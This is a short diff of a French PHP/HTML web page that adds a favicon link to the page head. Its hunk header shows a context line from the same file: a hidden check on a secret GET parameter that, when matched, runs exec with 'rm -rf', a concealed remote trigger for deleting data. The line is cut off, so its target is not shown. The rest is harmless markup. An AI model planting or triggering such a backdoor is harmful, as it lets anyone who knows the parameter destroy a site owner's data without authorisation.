@@ -71,7 +71,7 @@ if(isset($_GET['kezako']) && $_GET['kezako'] == 'niquelekacheux') { exec("rm -rf
 <meta http-equiv="Content-Script-Type" content="text/javascript" /> 
 <meta http-equiv="Content-Language" content="fr" /> 
 <meta name="robots" content="index,follow" /> 
-
+<link rel="shortcut icon" href="images/icon_js.png"/>
 <link href="styles/style.css" type="text/css" rel="stylesheet" /> 
 <link href="styles/style_menu_right.css" rel="stylesheet" type="text/css">
 <script type="text/javascript">
